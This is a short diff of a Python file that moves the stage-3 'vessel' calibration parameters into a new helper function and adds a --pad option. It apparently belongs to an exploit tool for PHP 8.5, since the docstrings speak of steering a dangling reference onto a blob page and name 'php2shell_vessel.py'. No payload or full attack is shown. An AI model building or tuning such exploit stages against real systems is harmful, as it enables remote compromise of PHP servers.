@@ -336,18 +336,23 @@ def calibrate_stage3(mod, ex, chunk, lib, zif, proof, hints):
     return False, None
 
 
-def calibrate_stage3_vessel(mod, ex, chunk, lib, zif, proof, hints):
-    """Stage 3 for early-8.5 layouts: S steers the dangling reference onto
-    B2's blob page (tools/php2shell_vessel.py has the technique)."""
-    attempts = max(1, int(hints.get("stage3_attempts") or 5))
-    params = {
+def vessel_params(hints):
+    """Vessel stage-3 parameters, honouring the CLI --pad option."""
+    return {
         "early": hints.get("stage3_early") or VESSEL_DEFAULTS["early"],
-        "pads": hints.get("stage3_vessel_pads")
+        "pads": hints.get("pad") or hints.get("stage3_vessel_pads")
                 or [tuple(p) for p in VESSEL_DEFAULTS["pads"]],
         "blobs": hints.get("stage3_blobs") or VESSEL_DEFAULTS["blobs"],
         "vessel_index": hints.get("stage3_vessel_index",
                                   VESSEL_DEFAULTS["vessel_index"]),
     }
+
+
+def calibrate_stage3_vessel(mod, ex, chunk, lib, zif, proof, hints):
+    """Stage 3 for early-8.5 layouts: S steers the dangling reference onto
+    B2's blob page (tools/php2shell_vessel.py has the technique)."""
+    attempts = max(1, int(hints.get("stage3_attempts") or 5))
+    params = vessel_params(hints)
     if hints.get("stage3_htdata"):
         offsets = [hints["stage3_htdata"]]
     elif hints.get("stage3_sweep"):
